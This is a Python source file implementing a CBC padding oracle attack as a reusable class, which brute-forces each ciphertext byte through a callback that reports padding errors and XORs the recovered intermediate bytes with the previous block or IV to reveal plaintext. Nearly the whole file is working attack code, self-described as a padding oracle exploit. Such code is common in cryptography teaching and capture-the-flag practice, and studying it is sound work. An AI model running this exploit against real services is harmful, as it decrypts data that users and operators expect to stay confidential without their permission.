from binascii import hexlify, unhexlify
from crypto import AESCipher
from ipdb import set_trace

class Oracle(object):

    def __init__(self, cipher, block_size, callback, debug, iv=None):
        """
            cipher (encrpyted message): bytes
            block_size (int): aes block size (default: 16)
            callback (function): oracle function with which takes the current payload and returns True if there was no Padding Exception
            debug: True/False for more output 
            iv (initialization vector, optionally): bytes
        """
        self.cipher = cipher
        self.block_size = block_size
        self.oracle = callback
        self.debug = debug
        self.iv = iv
        self.message_decrypted = []
        if not self.pack_cipher():
            print("padding of cipher is wrong")
            return
        self.solve_oracle()


    def pack_cipher(self):
        # checks if the cipher text we want to decrypt has a valid length
        # puts the bytes in a list of blocks
        print("Ciphertext in hex(%d): %s " % (len(self.cipher), hexlify(self.cipher)))
        if len(self.cipher) % self.block_size != 0:
            return False
        self.cipher_blocks = [self.cipher[i:i+self.block_size] for i in range(0,
                                                                              len(self.cipher),
                                                                              (self.block_size))
                             ] 
        print("Ciphertext Blocks in hex: %s" % " ".join([hexlify(b) for b in self.cipher_blocks]))
        return True


    def solve_oracle(self):
        """
            this function trys to decrypt the encrypted message. It iterates over all bytes in each block.
            If the oracle tells us that there is was no PaddingException (if it returns True) we can decrypt one byte of the ciphertext.
            After each block we reverse the collected intermediate bytes and XOR them with the previous ciphertext/IV 
        """
        for block_counter in reversed(range(len(self.cipher_blocks))):
            print("Block counter: %d" % block_counter)
            print("Processing block #%d: %s" % (block_counter, hexlify(self.cipher_blocks[block_counter])))
            intermediate = ""
            for round in range(self.block_size):
                print("Round counter: %d" % round)
                for guess in range(256):
                    #test_cipher = (self.block_size - len(intermediate) - 1) * "A"
                    test_cipher = (self.block_size - len(intermediate) - 1) * chr(16)
                    test_cipher += chr(guess)
                    for b in reversed(intermediate):
                        test_cipher += chr(ord(b) ^ (round + 1))
                        #print("Added known byte %s" % hexlify(test_cipher[-1]))
                    if self.debug == True:
                        # if you have access to the backend print the decrypted plaintext
                        # and check the last bytes, eg XX0303 where XX is the byte you are trying to brute force
                        print("Cipher we try now %s %s (%d) (%d)" % (hexlify(test_cipher),
                                                                  hexlify(self.cipher_blocks[block_counter]),
                                                                  len(hexlify(test_cipher)),
                                                                  len(self.cipher_blocks[block_counter])))
                    test_cipher = test_cipher +  self.cipher_blocks[block_counter]

                    if self.oracle(test_cipher):
                        print("Got no Padding Error for guess %s" % hex(guess))
                        inter = chr(guess ^ (round + 1))
                        print("Got intermediate byte #%d: %s" % ((self.block_size - round), hexlify(inter)))
                        intermediate += inter
                        print("All intermediates for this block: %s" % hexlify(intermediate))
                        break
                    else:
                        #print("Got an Padding Error")
                        pass
                if len(intermediate) != (round + 1):
                    print("We are done with byte %d but we didn't get an Padding Exception in this round. Quittig" % (round +1))
                    exit()
            print("Done with this round. Now XORING the intermediate bytes with the Cipher text of the previous ciphertext")
            intermediate = intermediate[::-1]
            if block_counter -1 < 0 and self.iv: # use iv instead of last ciphertext if we have some for the first block
                cipher_before = self.iv
            else:
                cipher_before = self.cipher_blocks[block_counter - 1]
            print("Cipher before in hex  : %s" % hexlify(cipher_before))
            plain_text_block = [chr(ord(intermediate[ii]) ^ ord(cipher_before[ii])) for ii in range(len(cipher_before))]
            print("Recovered plain text: %s " % plain_text_block)
            self.message_decrypted = plain_text_block + self.message_decrypted
        print("Done with padding oracle exploit")
        self.result = "".join(self.message_decrypted)
        print("Decrypted message: %s" % self.result)
